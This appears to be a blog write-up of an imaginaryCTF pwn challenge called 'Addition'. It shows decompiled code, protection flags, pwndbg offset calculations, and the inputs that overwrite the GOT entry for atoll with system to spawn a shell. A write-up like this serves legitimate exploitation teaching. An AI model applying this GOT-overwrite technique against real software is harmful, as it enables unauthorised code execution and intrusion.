---
title: "Addition"
date: "2025-09-07"
tags: ["imaginaryCTF", "got", "ret2libc"]
---

This time we get a binary that seems to be stuck in a loop, asking us for an address and a value.

```c
./vuln                                                      
+++++++++++++++++++++++++++
    WELCOME TO ADDITION
+++++++++++++++++++++++++++
add where? 0xdeadbeef
add what? hola
```

If we look at what is going on in Ghidra we can see the following:

```c
void main(void)

{
  longlong lVar1;
  longlong lVar2;
  long in_FS_OFFSET;
  char input [24];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("+++++++++++++++++++++++++++");
  puts("    WELCOME TO ADDITION");
  puts("+++++++++++++++++++++++++++");
  do {
    write(1,"add where? ",0xb);
    fgets(input,0x10,stdin);
    lVar1 = atoll(input);
    write(1,"add what? ",10);
    fgets(input,0x10,stdin);
    lVar2 = atoll(input);
    *(longlong *)(&buf + lVar1) = lVar2 + *(long *)(&buf + lVar1);
  } while (lVar1 != 0x539);
  FUN_001010f0(0);
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}
```

The code only has one function. It does ask for an address and then a value to write at that address. But there is a catch. The address they ask for is not absolute, and neither is the value. What I mean is, if we look at the following line:

```c
*(longlong *)(&buf + lVar1) = lVar2 + *(long *)(&buf + lVar1);
```

We can see that our input is added in both cases and ends up being relative to `&buf`.

If we check the protections we can see there is Partial RELRO:

```c
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

This means the GOT can be overwritten. If we look at the code in Ghidra we can see the following line:

```c
lVar1 = atoll(input);
```

Every input we type goes through the `atoll` function, which converts ASCII to long. That function takes a parameter we control. If we manage to replace that `atoll` with a `system` and pass it `/bin/sh` as the argument, we can get a shell.

Now, how do we do it? Since we have Partial RELRO, we can swap the GOT pointer of `atoll` for the one of `system`. For that we first need to know the distance between `&buf` (the point where we start writing if we put 0 in the address, which remember is relative) and the GOT of `atoll`.

```c
pwndbg> x &buf
0x555555558069:	0x00000000
pwndbg> got
. . .
[0x555555558020] atoll@GLIBC_2.2.5 -> 0x555555555070 ◂— endbr64 
. . .
pwndbg> x 0x555555558069 - 0x555555558020
0x49:	Cannot access memory at address 0x49
pwndbg> 
```

As we can see, `atoll` is 73 bytes behind where we start writing. That means that if we put `-73` as the first parameter, we will be writing on the `atoll` pointer.

Now we have to work out what to put in atoll. As we have seen, assigning the value is relative too, so we have to find out how much `atoll` needs to reach `system`.

```c
pwndbg> x &system
0x7ffff7c50d60 <__libc_system>:	0xfa1e0ff3
pwndbg> x &atoll
0x7ffff7c43670 <atoll>:	0xfa1e0ff3
pwndbg> x 0x7ffff7c50d60 - 0x7ffff7c43670
0xd6f0:	Cannot access memory at address 0xd6f0
```

As we can see, there are `0xd6f0` bytes, but the program works with `longs`, so we have to pass it as an integer:

```python
python3
>>> 0xd6f0
55024
```

Perfect. With this data we can make the GOT of `atoll` point to `system`. Remember that the code has this:

```c
atoll(nuestro_input)
```

So if we first swap `atoll` for `system` and then type `/bin/sh`, the program will do this:

```c
system("/bin/sh")
```

And we get a shell. Let's check it:

```c
+++++++++++++++++++++++++++
    WELCOME TO ADDITION
+++++++++++++++++++++++++++
add where? $ -73
add what? $ 55024
add where? $ /bin/sh
$ whoami
ub1cu0
$  
```

We have a shell!
